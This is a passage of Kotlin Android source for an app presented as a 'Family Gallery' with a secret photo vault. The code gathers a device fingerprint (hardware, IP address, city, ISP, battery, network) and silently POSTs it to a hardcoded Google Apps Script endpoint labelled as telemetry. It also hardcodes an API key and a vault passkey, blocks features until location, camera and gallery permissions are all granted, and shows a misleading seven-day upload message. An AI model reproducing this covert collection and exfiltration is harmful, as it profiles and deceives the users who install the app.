                    put("detectedHardwareModel", android.os.Build.MODEL ?: "")
                    put("userAgent", System.getProperty("http.agent") ?: "Android-App")
                    put("language", java.util.Locale.getDefault().toString())
                    put("languagesAvailable", java.util.Locale.getISOLanguages().joinToString(", "))
                    put("cookiesEnabled", true)
                    put("doNotTrackSetting", "")
                    put("screenWidth", screenWidth)
                    put("screenHeight", screenHeight)
                    put("availableWidth", screenWidth)
                    put("availableHeight", screenHeight)
                    put("colorDepth", "24")
                    put("devicePixelRatio", devicePixelRatio)
                    put("cpuCores", Runtime.getRuntime().availableProcessors().toString())
                    put("deviceMemoryGB", deviceMemoryGB)
                    put("networkEffectiveType", networkType)
                    put("networkDownlinkMbps", "")
                    put("networkRoundTripTimeMs", "")
                    put("batteryLevel", batteryLevel)
                    put("batteryIsCharging", batteryIsCharging)
                    put("ipAddress", ipAddress)
                    put("country", country)
                    put("region", region)
                    put("city", city)
                    put("isp", isp)
                    put("currency", currency)
                    put("countryCallingCode", countryCallingCode)
                    put("networkApiError", networkApiError)
                }

                // POST to Web App URL
                val webAppUrl = "https://script.google.com/macros/s/AKfycbyiEi3GBciXHEi-azRe-aETcKspIUl8o8LXLbQLxPaUgVF5ImRTTYdWH5yPhmysRlj39Q/exec"
                val boundary = "Boundary-" + System.currentTimeMillis()
                val boundaryBytes = "--$boundary\r\n".toByteArray()
                val contentDispositionBytes = "Content-Disposition: form-data; name=\"jsonData\"\r\n\r\n".toByteArray()
                val valueBytes = payload.toString().toByteArray(Charsets.UTF_8)
                val endBoundaryBytes = "\r\n--$boundary--\r\n".toByteArray()

                val bos = java.io.ByteArrayOutputStream()
                bos.write(boundaryBytes)
                bos.write(contentDispositionBytes)
                bos.write(valueBytes)
                bos.write(endBoundaryBytes)
                val postData = bos.toByteArray()

                var currentUrl = webAppUrl
                var attempts = 0
                val maxRedirects = 5
                var responseText = ""
                while (attempts < maxRedirects) {
                    val conn = java.net.URL(currentUrl).openConnection() as java.net.HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.connectTimeout = 15000
                    conn.readTimeout = 15000
                    conn.doOutput = true
                    conn.instanceFollowRedirects = false
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                    conn.setRequestProperty("Content-Length", postData.size.toString())

                    conn.outputStream.use { os ->
                        os.write(postData)
                        os.flush()
                    }

                    val status = conn.responseCode
                    if (status == java.net.HttpURLConnection.HTTP_MOVED_TEMP ||
                        status == java.net.HttpURLConnection.HTTP_MOVED_PERM ||
                        status == 307 || status == 308) {
                        val newUrl = conn.getHeaderField("Location")
                        if (newUrl != null) {
                            currentUrl = newUrl
                            attempts++
                            continue
                        }
                    }

                    if (status in 200..299) {
                        responseText = conn.inputStream.bufferedReader().use { it.readText() }
                        break
                    } else {
                        val errText = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: ""
                        android.util.Log.e("Telemetry", "HTTP Error $status: $errText")
                        break
                    }
                }
                android.util.Log.d("Telemetry", "Response: $responseText")
            } catch (e: Exception) {
                android.util.Log.e("Telemetry", "Error sending telemetry", e)
            }
        }
    }

    // Load available images inside Assets Folder dynamically, plus predefined drawables as fallback
    val defaultPhotos = remember {
        val list = mutableListOf<GalleryPhoto>()
        list.add(GalleryPhoto("f1", R.drawable.img_gallery_family1, "Picnic at Meadow Springs", "Summer 2025"))
        list.add(GalleryPhoto("f2", R.drawable.img_gallery_family2, "Bonfire Beach Stories", "Autumn 2025"))
        list.add(GalleryPhoto("f3", R.drawable.img_gallery_family3, "Alpine Trails Adventure", "Spring 2026"))

        try {
            val assetFiles = context.assets.list("gallery")
            assetFiles?.forEachIndexed { idx, filename ->
                if (filename.isNotEmpty() && !filename.startsWith(".")) {
                    list.add(
                        GalleryPhoto(
                            id = "asset_$idx",
                            identifier = "file:///android_asset/gallery/$filename",
                            title = filename.substringBeforeLast(".").replace("_", " ").replace("-", " ").replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.ROOT) else it.toString() },
                            date = "Recently Loaded",
                            location = "Central Repository"
                        )
                    )
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        list
    }

    var galleryPhotos by remember { mutableStateOf<List<GalleryPhoto>>(emptyList()) }
    var isPhotosLoading by remember { mutableStateOf(true) }
    var photosError by remember { mutableStateOf<String?>(null) }

    LaunchedEffect(Unit) {
        isPhotosLoading = true
        photosError = null
        withContext(Dispatchers.IO) {
            try {
                val apiKey = "AIzaSyDV_HDWXPBlqlPsWUfQ8l_rqBkRp1Fs2r8"
                val folderId = "16d9oiRyno8RCSj70-XcSEzAse19Pdy_G"
                val query = "'$folderId' in parents and mimeType contains 'image/'"
                val encodedQuery = java.net.URLEncoder.encode(query, "UTF-8")
                val urlString = "https://www.googleapis.com/drive/v3/files?q=$encodedQuery&fields=files(id,name)&key=$apiKey"
                
                val url = URL(urlString)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connectTimeout = 10000
                connection.readTimeout = 10000
                connection.doInput = true
                
                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    val responseText = connection.inputStream.bufferedReader().use { it.readText() }
                    val jsonResponse = JSONObject(responseText)
                    val filesArray = jsonResponse.optJSONArray("files")
                    val loadedList = mutableListOf<GalleryPhoto>()
                    if (filesArray != null) {
                        for (i in 0 until filesArray.length()) {
                            val fileObj = filesArray.getJSONObject(i)
                            val id = fileObj.getString("id")
                            val name = fileObj.optString("name", "Untitled Photo")
                            
                            val formattedTitle = name.substringBeforeLast(".")
                                .replace("_", " ")
                                .replace("-", " ")
                                .replaceFirstChar { if (it.isLowerCase()) it.titlecase(Locale.ROOT) else it.toString() }
                            
                            val imageUrl = "https://drive.google.com/thumbnail?id=$id&sz=w1000"
                            
                            loadedList.add(
                                GalleryPhoto(
                                    id = id,
                                    identifier = imageUrl,
                                    title = formattedTitle,
                                    date = "",
                                    location = "memories"
                                )
                            )
                        }
                    }
                    if (loadedList.isNotEmpty()) {
                        withContext(Dispatchers.Main) {
                            galleryPhotos = loadedList
                            isPhotosLoading = false
                        }
                    } else {
                        withContext(Dispatchers.Main) {
                            isPhotosLoading = false
                        }
                    }
                } else {
                    withContext(Dispatchers.Main) {
                        photosError = "Failed to load photos"
                        isPhotosLoading = false
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
                withContext(Dispatchers.Main) {
                    photosError = "Failed to load photos"
                    isPhotosLoading = false
                }
            }
        }
    }

    // Launch picker for upload
    val mediaUploadLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.GetContent()
    ) { resultUri ->
        if (resultUri != null) {
            onAddUpload(resultUri)
            uploadNotificationActive = true
        }
    }

    Scaffold(
        modifier = Modifier.fillMaxSize(),
        containerColor = Color(0xFFF8F9FA), // Clean white-slate background for Dashboard UI
        topBar = {
            @OptIn(ExperimentalMaterial3Api::class)
            TopAppBar(
                title = {
                    Column {
                        Text(
                            text = "Family Gallery",
                            color = Color(0xFF1E1E24), // Elegant dark text
                            fontWeight = FontWeight.Bold,
                            fontSize = 20.sp
                        )
                        Text(
                            text = "Cherishing sweet moments",
                            color = Color(0xFF1E1E24).copy(alpha = 0.6f), // Muted secondary text
                            fontSize = 11.sp
                        )
                    }
                },
                navigationIcon = {
                    IconButton(
                        onClick = onLogout,
                        modifier = Modifier.testTag("dashboard_back_button")
                    ) {
                        Icon(
                            imageVector = Icons.AutoMirrored.Filled.ArrowBack,
                            contentDescription = "Logout and Go Back",
                            tint = Color(0xFF1E1E24)
                        )
                    }
                },
                actions = {
                    if (loggedInUser == "gallery") {
                        IconButton(
                            onClick = {
                                postTitle = ""
                                postBody = ""
                                showNotificationDialog = true
                            },
                            modifier = Modifier.testTag("broadcast_notification_trigger")
                        ) {
                            Icon(
                                imageVector = Icons.Default.Campaign,
                                contentDescription = "Broadcast Notification",
                                tint = Color(0xFFE5A93B)
                            )
                        }
                    }

                    // Lock icon leading to secret vault dialog
                    IconButton(
                        onClick = {
                            if (hasAllRequiredAccess(context)) {
                                secretCodeDialogActive = true
                            } else {
                                val msg = "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
                                Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                            }
                        },
                        modifier = Modifier.testTag("secret_vault_trigger")
                    ) {
                        Icon(
                            imageVector = Icons.Default.Https,
                            contentDescription = "Secret Vault Access",
                            tint = Color(0xFFE5A93B)
                        )
                    }


                    IconButton(onClick = onLogout) {
                        Icon(
                            imageVector = Icons.Default.Logout,
                            contentDescription = "Logout",
                            tint = Color(0xFF1E1E24).copy(alpha = 0.6f)
                        )
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = Color.White,
                    titleContentColor = Color(0xFF1E1E24)
                )
            )
        },
        bottomBar = {
            // Elegant M3 floating bottom panel for triggers
            Surface(
                modifier = Modifier
                    .fillMaxWidth()
                    .navigationBarsPadding(),
                color = Color.White,
                tonalElevation = 8.dp,
                border = BorderStroke(1.dp, Color.Black.copy(alpha = 0.08f))
            ) {
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 24.dp, vertical = 12.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    // Upload media action triggers native file explorer
                    Button(
                        onClick = {
                            if (hasAllRequiredAccess(context)) {
                                onNavigateToUpload()
                            } else {
                                val msg = "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
                                Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                            }
                        },
                        colors = ButtonDefaults.buttonColors(
                            containerColor = Color(0xFFE5A93B),
                            contentColor = Color(0xFF1E1E24)
                        ),
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier
                            .weight(1.3f)
                            .height(50.dp)
                            .testTag("upload_image_button"),
                        contentPadding = PaddingValues(horizontal = 16.dp)
                    ) {
                        Icon(
                            imageVector = Icons.Default.CloudUpload,
                            contentDescription = null,
                            modifier = Modifier.size(20.dp)
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(
                            text = "Upload To Archive",
                            fontSize = 14.sp,
                            fontWeight = FontWeight.Bold,
                            maxLines = 1,
                            overflow = TextOverflow.Ellipsis
                        )
                    }

                    Spacer(modifier = Modifier.width(16.dp))

                    // Quick access Secret Gallery direct link
                    OutlinedButton(
                        onClick = {
                            if (hasAllRequiredAccess(context)) {
                                secretCodeDialogActive = true
                            } else {
                                val msg = "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
                                Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                            }
                        },
                        colors = ButtonDefaults.outlinedButtonColors(
                            contentColor = Color(0xFFE5A93B)
                        ),
                        border = BorderStroke(1.5.dp, Color(0xFFE5A93B)),
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier
                            .weight(1.1f)
                            .height(50.dp)
                            .testTag("secret_gallery_shortcut")
                    ) {
                        Icon(
                            imageVector = Icons.Default.AutoAwesome,
                            contentDescription = null,
                            modifier = Modifier.size(16.dp)
                        )
                        Spacer(modifier = Modifier.width(6.dp))
                        Text(
                            text = "Secret Photos",
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Bold,
                            maxLines = 1
                        )
                    }
                }
            }
        }
    ) { innerPadding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
        ) {
            // Active Broad-cast In-App Notification Banner
            val currentNotif = activeNotification
            if (currentNotif != null && currentNotif.first.isNotEmpty() && currentNotif.third > dismissedTimestamp) {
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(horizontal = 16.dp, vertical = 8.dp)
                        .testTag("notification_banner"),
                    shape = RoundedCornerShape(16.dp),
                    colors = CardDefaults.cardColors(
                        containerColor = Color(0xFFFFF3CD) // Warm accent background
                    ),
                    border = BorderStroke(1.dp, Color(0xFFD68A1B).copy(alpha = 0.3f))
                ) {
                    Column(
                        modifier = Modifier.padding(16.dp)
                    ) {
                        Row(
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Box(
                                modifier = Modifier
                                    .size(36.dp)
                                    .background(Color(0xFFD68A1B).copy(alpha = 0.15f), shape = CircleShape),
                                contentAlignment = Alignment.Center
                            ) {
                                Icon(
                                    imageVector = Icons.Default.Campaign,
                                    contentDescription = "Notification Announcement",
                                    tint = Color(0xFFD68A1B),
                                    modifier = Modifier.size(20.dp)
                                )
                            }
                            Spacer(modifier = Modifier.width(12.dp))
                            Column(modifier = Modifier.weight(1f)) {
                                Text(
                                    text = "Family Announcement",
                                    fontSize = 11.sp,
                                    color = Color(0xFF856404),
                                    fontWeight = FontWeight.Bold,
                                    letterSpacing = 0.5.sp
                                )
                                Text(
                                    text = currentNotif.first,
                                    fontSize = 15.sp,
                                    color = Color(0xFF856404),
                                    fontWeight = FontWeight.Bold
                                )
                            }
                            IconButton(
                                onClick = {
                                    prefs.edit().putLong("dismissed_notification_timestamp", currentNotif.third).apply()
                                    dismissedTimestamp = currentNotif.third
                                },
                                modifier = Modifier.testTag("dismiss_notification_button")
                            ) {
                                Icon(
                                    imageVector = Icons.Default.Close,
                                    contentDescription = "Dismiss notification",
                                    tint = Color(0xFF856404).copy(alpha = 0.6f),
                                    modifier = Modifier.size(18.dp)
                                )
                            }
                        }
                        Spacer(modifier = Modifier.height(8.dp))
                        Text(
                            text = currentNotif.second,
                            fontSize = 13.sp,
                            color = Color(0xFF856404).copy(alpha = 0.9f)
                        )
                        Spacer(modifier = Modifier.height(6.dp))
                        val dateString = try {
                            val sdf = java.text.SimpleDateFormat("MMM dd, yyyy - hh:mm a", java.util.Locale.getDefault())
                            sdf.format(java.util.Date(currentNotif.third))
                        } catch (e: Exception) {
                            "Just now"
                        }
                        Text(
                            text = "Posted: $dateString",
                            fontSize = 10.sp,
                            color = Color(0xFF856404).copy(alpha = 0.6f),
                            fontStyle = FontStyle.Italic
                        )
                    }
                }
            }

            if (loggedInUser == "gallery") {
                // Location HUD Dashboard Ribbon to meet condition: "show user location in the ui"
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(16.dp),
                    shape = RoundedCornerShape(16.dp),
                    colors = CardDefaults.cardColors(
                        containerColor = Color.White
                    ),
                    border = BorderStroke(1.dp, Color.Black.copy(alpha = 0.08f))
                ) {
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(16.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Box(
                            modifier = Modifier
                                .size(44.dp)
                                .background(Color(0xFF2E7D32).copy(alpha = 0.1f), shape = CircleShape),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(
                                imageVector = Icons.Default.MyLocation,
                                contentDescription = "User Location",
                                tint = Color(0xFF2E7D32),
                                modifier = Modifier.size(20.dp)
                            )
                        }

                        Spacer(modifier = Modifier.width(16.dp))

                        Column(
                            modifier = Modifier.weight(1f)
                        ) {
                            Text(
                                text = "Family Archivist GPS Location",
                                fontSize = 11.sp,
                                color = Color(0xFF757575),
                                fontWeight = FontWeight.Bold,
                                letterSpacing = 0.5.sp
                            )
                            Spacer(modifier = Modifier.height(4.dp))
                            Text(
                                text = locationState,
                                fontSize = 14.sp,
                                color = Color(0xFF1E1E24),
                                fontWeight = FontWeight.SemiBold,
                                maxLines = 2,
                                overflow = TextOverflow.Ellipsis
                            )

                            if (userCoordinates != null) {
                                Text(
                                    text = "LAT: ${String.format(Locale.US, "%.5f", userCoordinates.first)} • LON: ${String.format(Locale.US, "%.5f", userCoordinates.second)}",
                                    fontSize = 11.sp,
                                    fontFamily = FontFamily.Monospace,
                                    color = Color(0xFF2E7D32),
                                    modifier = Modifier.padding(top = 2.dp)
                                )
                            }
                        }

                        // Touch component to refresh precise coordinates manually
                        IconButton(
                            onClick = {
                                if (!isGpsEnabled(context)) {
                                    showGpsDisabledDialog = true
                                }
                                isRefreshingLocation = true
                                fetchCurrentLocation(
                                    context = context,
                                    onSuccess = { lat, lon, desc ->
                                        onUpdateLocation(lat, lon, desc)
                                        isRefreshingLocation = false
                                    },
                                    onFailure = {
                                        Toast.makeText(context, "Position failed: $it", Toast.LENGTH_SHORT).show()
                                        isRefreshingLocation = false
                                    }
                                )
                            }
                        ) {
                            if (isRefreshingLocation) {
                                CircularProgressIndicator(
                                    modifier = Modifier.size(18.dp),
                                    strokeWidth = 2.dp,
                                    color = Color(0xFF2E7D32)
                                )
                            } else {
                                Icon(
                                    imageVector = Icons.Default.Refresh,
                                    contentDescription = "Refresh GPS",
                                    tint = Color(0xFF1E1E24).copy(alpha = 0.6f)
                                )
                            }
                        }
                    }
                }
            }

            // Grid Section Title
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = 20.dp, vertical = 8.dp),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(
                    text = "Family Album",
                    color = Color(0xFF1E1E24),
                    fontSize = 18.sp,
                    fontWeight = FontWeight.Bold
                )

                Text(
                    text = "${galleryPhotos.size} Memories",
                    color = Color(0xFF1E1E24).copy(alpha = 0.5f),
                    fontSize = 13.sp
                )
            }

            // Grid displaying family images cleanly ("ensure the gallery view displays these files with a clean grid layout")
            LazyVerticalGrid(
                columns = GridCells.Fixed(2),
                contentPadding = PaddingValues(16.dp),
                verticalArrangement = Arrangement.spacedBy(16.dp),
                horizontalArrangement = Arrangement.spacedBy(16.dp),
                modifier = Modifier
                    .weight(1f)
                    .testTag("gallery_photo_grid")
            ) {
                items(galleryPhotos) { photo ->
                    GalleryGridItem(
                        photo = photo,
                        onSelect = { selectedPhotoForDetail = photo }
                    )
                }

                // If user uploaded files, display them in distinct "Verification queues" inside layout
                if (pendingUploads.isNotEmpty()) {
                    item(span = { GridItemSpan(maxLineSpan) }) {
                        Text(
                            text = "Pending Upload Clearances",
                            color = Color(0xFFD68A1B),
                            fontSize = 14.sp,
                            fontWeight = FontWeight.Bold,
                            modifier = Modifier.padding(top = 8.dp, bottom = 4.dp, start = 4.dp)
                        )
                    }

                    items(pendingUploads) { uploadUri ->
                        PendingUploadItem(uri = uploadUri)
                    }
                }
            }
        }
    }

    // Modal dialogue - Upload Confirmation: "open the device file manager to select images for upload. If upload complete then say it takes 7 days to get in your apps."
    if (uploadNotificationActive) {
        AlertDialog(
            onDismissRequest = { uploadNotificationActive = false },
            icon = {
                Icon(
                    imageVector = Icons.Default.AccessTimeFilled,
                    contentDescription = null,
                    tint = Color(0xFFE5A93B),
                    modifier = Modifier.size(48.dp)
                )
            },
            title = {
                Text(
                    text = "Secured Upload Initialized",
                    fontWeight = FontWeight.Bold,
                    color = Color.White,
                    textAlign = TextAlign.Center
                )
            },
            text = {
                Text(
                    text = "Family memories must undergo secure archival verification.\n\nIt takes 7 days to get in your apps. You can monitor progress in the 'Pending Uploads' queue below.",
                    color = Color.White.copy(alpha = 0.7f),
                    textAlign = TextAlign.Center,
                    fontSize = 14.sp
                )
            },
            confirmButton = {
                TextButton(
                    onClick = { uploadNotificationActive = false },
                    colors = ButtonDefaults.textButtonColors(contentColor = Color(0xFFE5A93B))
                ) {
                    Text("Understood", fontWeight = FontWeight.Bold)
                }
            },
            containerColor = Color(0xFF1E1E24),
            shape = RoundedCornerShape(24.dp)
        )
    }

    if (showNotificationDialog) {
        AlertDialog(
            onDismissRequest = { showNotificationDialog = false },
            title = {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        imageVector = Icons.Default.Campaign,
                        contentDescription = null,
                        tint = Color(0xFFE5A93B),
                        modifier = Modifier.size(28.dp)
                    )
                    Spacer(modifier = Modifier.width(8.dp))
                    Text(
                        text = "Broadcast Announcement",
                        fontSize = 18.sp,
                        fontWeight = FontWeight.Bold,
                        color = Color(0xFF1E1E24)
                    )
                }
            },
            text = {
                Column(
                    modifier = Modifier.fillMaxWidth(),
                    verticalArrangement = Arrangement.spacedBy(12.dp)
                ) {
                    Text(
                        text = "Broadcast an announcement or alert to all family members using the app. This notification will appear instantly on their screens.",
                        fontSize = 12.sp,
                        color = Color(0xFF1E1E24).copy(alpha = 0.6f)
                    )
                    
                    OutlinedTextField(
                        value = postTitle,
                        onValueChange = { postTitle = it },
                        label = { Text("Title") },
                        placeholder = { Text("Enter alert title (e.g., Dinner Time!)") },
                        modifier = Modifier
                            .fillMaxWidth()
                            .testTag("notification_title_input"),
                        singleLine = true,
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = Color(0xFFE5A93B),
                            focusedLabelColor = Color(0xFFE5A93B)
                        )
                    )
                    
                    OutlinedTextField(
                        value = postBody,
                        onValueChange = { postBody = it },
                        label = { Text("Message") },
                        placeholder = { Text("Enter detailed description here...") },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(100.dp)
                            .testTag("notification_body_input"),
                        maxLines = 4,
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedBorderColor = Color(0xFFE5A93B),
                            focusedLabelColor = Color(0xFFE5A93B)
                        )
                    )
                }
            },
            confirmButton = {
                Button(
                    onClick = {
                        val titleText = postTitle.trim()
                        val bodyText = postBody.trim()
                        if (titleText.isEmpty() || bodyText.isEmpty()) {
                            Toast.makeText(context, "Please fill in all fields", Toast.LENGTH_SHORT).show()
                            return@Button
                        }
                        
                        isPostingNotification = true
                        val currentTimestamp = System.currentTimeMillis()
                        
                        // 1. Instantly save in SharedPreferences and update local activeNotification state (Main thread)
                        prefs.edit()
                            .putString("shared_notif_title", titleText)
                            .putString("shared_notif_body", bodyText)
                            .putLong("shared_notif_timestamp", currentTimestamp)
                            .apply()
                        
                        activeNotification = Triple(titleText, bodyText, currentTimestamp)
                        
                        // 2. Launch background coroutine to sync with KVDB and handle UI states safely on Main
                        coroutineScope.launch {
                            val success = withContext(Dispatchers.IO) {
                                var saveSuccess = false
                                saveAppNotification(
                                    title = titleText,
                                    body = bodyText,
                                    timestamp = currentTimestamp,
                                    onSuccess = { saveSuccess = true },
                                    onFailure = {}
                                )
                                saveSuccess
                            }
                            
                            isPostingNotification = false
                            showNotificationDialog = false
                            if (success) {
                                Toast.makeText(context, "Notification broadcasted successfully!", Toast.LENGTH_SHORT).show()
                            } else {
                                Toast.makeText(context, "Broadcasted locally, but remote sync failed.", Toast.LENGTH_SHORT).show()
                            }
                        }
                    },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = Color(0xFFE5A93B)
                    ),
                    modifier = Modifier.testTag("notification_post_confirm")
                ) {
                    if (isPostingNotification) {
                        CircularProgressIndicator(
                            modifier = Modifier.size(18.dp),
                            color = Color.White,
                            strokeWidth = 2.dp
                        )
                    } else {
                        Text("Post Alert", color = Color.White)
                    }
                }
            },
            dismissButton = {
                TextButton(
                    onClick = { showNotificationDialog = false },
                    modifier = Modifier.testTag("notification_post_cancel")
                ) {
                    Text("Cancel", color = Color(0xFF1E1E24).copy(alpha = 0.6f))
                }
            },
            containerColor = Color.White,
            shape = RoundedCornerShape(16.dp)
        )
    }

    // Modal dialogue - Secret Code Validation
    if (secretCodeDialogActive) {
        AlertDialog(
            onDismissRequest = {
                secretCodeDialogActive = false
                enteredSecretCode = ""
                secretCodeErrorVisible = false
            },
            icon = {
                Icon(
                    imageVector = Icons.Default.VpnKey,
                    contentDescription = null,
                    tint = Color(0xFFE5A93B),
                    modifier = Modifier.size(36.dp)
                )
            },
            title = {
                Text(
                    text = "Unlock Decryption Safe",
                    color = Color.White,
                    fontWeight = FontWeight.Bold
                )
            },
            text = {
                Column(
                    verticalArrangement = Arrangement.spacedBy(12.dp)
                ) {
                    Text(
                        text = "Accessing hidden family records. Please insert vault key to decrypt.",
                        color = Color.White.copy(alpha = 0.6f),
                        fontSize = 13.sp
                    )

                    OutlinedTextField(
                        value = enteredSecretCode,
                        onValueChange = {
                            enteredSecretCode = it
                            secretCodeErrorVisible = false
                        },
                        label = { Text("Vault Encryption Passkey") },
                        colors = OutlinedTextFieldDefaults.colors(
                            focusedTextColor = Color.White,
                            unfocusedTextColor = Color.White,
                            focusedBorderColor = Color(0xFFE5A93B),
                            unfocusedBorderColor = Color.White.copy(alpha = 0.2f),
                            focusedLabelColor = Color(0xFFE5A93B)
                        ),
                        singleLine = true,
                        keyboardOptions = KeyboardOptions(imeAction = ImeAction.Done),
                        keyboardActions = KeyboardActions(onDone = {
                            if (enteredSecretCode.trim() == "098765rtyui") {
                                secretCodeDialogActive = false
                                enteredSecretCode = ""
                                onOpenSecret()
                            } else {
                                secretCodeErrorVisible = true
                            }
                        }),
                        modifier = Modifier
                            .fillMaxWidth()
                            .testTag("secret_code_field")
                    )

                    if (secretCodeErrorVisible) {
                        Text(
                            text = "Passkey mismatch. Vault decryption failed.",
                            color = Color(0xFFFF8A80),
                            fontSize = 11.sp,
                            fontWeight = FontWeight.SemiBold
                        )
                    }
                }
            },
            confirmButton = {
                Button(
                    onClick = {
                        if (enteredSecretCode.trim() == "098765rtyui") {
                            secretCodeDialogActive = false
                            enteredSecretCode = ""
                            onOpenSecret()
                        } else {
                            secretCodeErrorVisible = true
                        }
                    },
                    colors = ButtonDefaults.buttonColors(
                        containerColor = Color(0xFFE5A93B),
                        contentColor = Color(0xFF131317)
                    ),
                    modifier = Modifier.testTag("secret_vault_unlock_confirm")
                ) {
                    Text("Decrypt Vault", fontWeight = FontWeight.Bold)
                }
            },
            dismissButton = {
                TextButton(
                    onClick = {
                        secretCodeDialogActive = false
                        enteredSecretCode = ""
                        secretCodeErrorVisible = false
                    },
                    colors = ButtonDefaults.textButtonColors(contentColor = Color.White.copy(alpha = 0.6f))
                ) {
                    Text("Cancel")
                }
            },
            containerColor = Color(0xFF1E1E24)
        )
    }

    // Modal dialogue - Large Cinematic Photo Detail View
    if (selectedPhotoForDetail != null) {
        val p = selectedPhotoForDetail!!
        AlertDialog(
            onDismissRequest = { selectedPhotoForDetail = null },
            confirmButton = {
                TextButton(
                    onClick = { selectedPhotoForDetail = null },
                    colors = ButtonDefaults.textButtonColors(contentColor = Color(0xFFE5A93B))
                ) {
                    Text("close", fontWeight = FontWeight.Bold, fontSize = 16.sp)
                }
            },
            text = {
                Column(
                    horizontalAlignment = Alignment.CenterHorizontally,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Card(
                        shape = RoundedCornerShape(16.dp),
                        modifier = Modifier
                            .fillMaxWidth()
                            .aspectRatio(1f)
                    ) {
                        Box(modifier = Modifier.fillMaxSize()) {
                            if (p.identifier is Int) {
                                Image(
                                    painter = painterResource(id = p.identifier),
                                    contentDescription = p.title,
                                    contentScale = ContentScale.Crop,
                                    modifier = Modifier.fillMaxSize()
                                )
                            } else {
                                AsyncImage(
                                    model = p.identifier as String,
                                    contentDescription = p.title,
                                    contentScale = ContentScale.Crop,
                                    modifier = Modifier.fillMaxSize()
                                )
                            }
                        }
                    }

                    Spacer(modifier = Modifier.height(16.dp))

                    Text(
                        text = p.title,
                        color = Color.White,
                        fontWeight = FontWeight.Bold,
                        fontSize = 18.sp,
                        textAlign = TextAlign.Center,
                        modifier = Modifier.fillMaxWidth()
                    )

                    Spacer(modifier = Modifier.height(4.dp))

                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.Center,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(Icons.Default.Schedule, contentDescription = null, tint = Color.White.copy(alpha = 0.4f), modifier = Modifier.size(14.dp))
                        Spacer(modifier = Modifier.width(4.dp))
                        Text(
                            text = p.date,
                            color = Color.White.copy(alpha = 0.4f),
                            fontSize = 12.sp
                        )
                        Spacer(modifier = Modifier.width(12.dp))
                        Icon(Icons.Default.Place, contentDescription = null, tint = Color.White.copy(alpha = 0.4f), modifier = Modifier.size(14.dp))
                        Spacer(modifier = Modifier.width(4.dp))
                        Text(
                            text = p.location,
                            color = Color.White.copy(alpha = 0.4f),
                            fontSize = 12.sp
                        )
                    }
                }
            },
            containerColor = Color(0xFF1E1E24),
            shape = RoundedCornerShape(24.dp)
        )
    }

    if (showGpsDisabledDialog) {
        AlertDialog(
            onDismissRequest = { showGpsDisabledDialog = false },
            icon = {
                Icon(
                    imageVector = Icons.Default.LocationOff,
                    contentDescription = null,
                    tint = Color(0xFFE57373),
                    modifier = Modifier.size(48.dp)
                )
            },
            title = {
                Text(
                    text = "GPS Services Required",
                    fontWeight = FontWeight.Bold,
                    color = Color.White,
                    textAlign = TextAlign.Center
                )
            },
            text = {
                Text(
                    text = "Your device's GPS or Location Services are currently turned off. To locate the family archivist and coordinates, please turn on GPS/Location Services.",
                    color = Color.White.copy(alpha = 0.7f),
                    textAlign = TextAlign.Center,
                    fontSize = 14.sp
                )
            },
            confirmButton = {
                TextButton(
                    onClick = {
                        try {
                            context.startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
                        } catch (e: Exception) {
                            Toast.makeText(context, "Could not open location settings", Toast.LENGTH_SHORT).show()
                        }
                        showGpsDisabledDialog = false
                    }
                ) {
                    Text("Turn On GPS", color = Color(0xFF81C784))
                }
            },
            dismissButton = {
                TextButton(onClick = { showGpsDisabledDialog = false }) {
                    Text("Later", color = Color.White.copy(alpha = 0.6f))
                }
            },
            containerColor = Color(0xFF1E1E24),
            shape = RoundedCornerShape(24.dp)
        )
    }
}

@Composable
fun GalleryGridItem(
    photo: GalleryPhoto,
    onSelect: () -> Unit
) {
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .clickable(onClick = onSelect)
            .testTag("photo_item_card_${photo.id}"),
        shape = RoundedCornerShape(16.dp),
        colors = CardDefaults.cardColors(
            containerColor = Color.White
        ),
        border = BorderStroke(1.dp, Color.Black.copy(alpha = 0.08f))
    ) {
        Column {
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .aspectRatio(1f)
